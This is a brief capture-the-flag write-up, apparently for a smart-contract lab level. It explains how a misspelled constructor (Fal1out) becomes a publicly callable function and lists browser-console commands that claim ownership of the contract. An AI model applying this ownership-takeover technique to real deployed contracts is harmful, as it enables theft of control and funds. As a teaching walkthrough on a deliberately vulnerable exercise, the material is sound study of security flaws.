## Explanation

Claim ownership of a contract by exploiting a developer typo. Function fallout() is misspelled as fal1out(), causing the constructor function to become a public function that you can call anytime.

## Solution in console

To solve challange in browser console it is necessary to write:
```bash
# We will see current contract owner
await contract.owner();
# Calling typo function
await contract.Fal1out();
# We will see that we are the owner
await contract.owner();
```